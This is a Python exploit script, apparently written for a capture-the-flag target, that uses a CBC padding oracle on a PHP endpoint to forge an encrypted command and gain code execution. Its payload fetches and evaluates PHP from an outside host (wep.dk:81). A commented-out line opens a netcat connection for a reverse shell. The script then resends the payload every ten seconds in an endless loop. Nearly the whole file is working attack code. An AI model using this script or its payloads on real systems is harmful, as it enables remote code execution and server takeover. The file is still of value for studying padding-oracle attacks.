from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from tqdm import tqdm
from pwn import xor
import requests
import base64


BLOCK_SIZE = 16
target = "http://bibliobibuli.ctf/rfcs/x.php"

# local website used for testing
# target = "https://static.wep.dk/fe/x.php"

# get cookie
s = requests.Session()
ct = s.get(target).text
print(ct)

print("session cookie")
print(s.cookies.get_dict())

# test a ciphertext on endpoint
def is_padding_ok(x, verbose=False, s=s):
    if verbose:
        print("sending request")
    # x = base64.urlsafe_b64encode(x)
    x = base64.b64encode(x).decode()
    res = s.post(target, data={"c":x})
    if verbose:
        print("incoming pt")
        print(res.text)
        print()
    # print(s.cookies.get_dict())
    if res.status_code == 500:
        return False
    else:
        return True


# perform a CBC padding oracle attack to turn the server into an ECB decryption oracle
def attack_message(msg):
    # msg = [x for x in msg ]
    cipherfake=[0] * 16
    plaintext = [0] * 16
    current = 0
    message=b""

    #I devide the list of bytes in blocks, and I put them in another list
    number_of_blocks = int(len(msg)/BLOCK_SIZE)
    blocks = [[]] * number_of_blocks
    for i in (range(number_of_blocks)):
        blocks[i] = msg[i * BLOCK_SIZE: (i + 1) * BLOCK_SIZE]

    for z in range(len(blocks)-1):  #for each message, I calculate the number of block
        for itera in tqdm(range(1,17)): #the length of each block is 16. I start by one because than I use its in a counter

            for v in range(256):
                cipherfake[-itera]=v
                if is_padding_ok(bytes(cipherfake)+blocks[z+1]): #the idea is that I put in 'is_padding_ok' the cipherfake(array of all 0) plus the last block
                                                                 #if the function return true I found the value
                    current=itera
                    plaintext[-itera]= v^itera^blocks[z][-itera]
                    print(plaintext)

            for w in range(1,current+1):
                cipherfake[-w] = plaintext[-w]^itera+1^blocks[z][-w] #for decode the second byte I must set the previous bytes with 'itera+1'


        message += bytes(plaintext)
        print(message)

    return message


def forge_ct(target):
    target = b'\n' + target
    target = pad(target,16)
    target_blocks = [target[i:i+16] for i in range(0, len(target), 16)]
    ctplain = b'\x00'*(len(target) + 16)
    ct_blocks = [ctplain[i:i+16] for i in range(0, len(ctplain), 16)]
    ctlast = b'\x00'*16
    payload_ct = b''
    for x in target_blocks[::-1]:
        ct = b'\x00'*16 + ctlast
        val = attack_message(ct)
        payload_ct = ct[16:] + payload_ct
        ctlast = xor(val,x)
        print(f'current iter = {ctlast + payload_ct}')
    payload_ct = ctlast + payload_ct
    return payload_ct


    

# payload = b'sleep 10'
# # payload = b'nc 10.13.37.114 1234'
# payload which queries our endpoint, and runs the code it receives.
# As payloads take a while to generate, this let us experiment with various reverse shells without needing to remake payload.
payload = b"php -r 'eval(file_get_contents(\"http://wep.dk:81\"));'"
final_payload = forge_ct(payload)
print(s.cookies.get_dict())
print(f'final payload is {final_payload}')
print(is_padding_ok(final_payload, verbose=True))


import time
# Repeatedly deploy payload every 10 seconds, so we can experiment on server without interacting.
while True:
    print("pinging")
    print(is_padding_ok(final_payload, verbose=True, s=s))
    time.sleep(10)

exit()

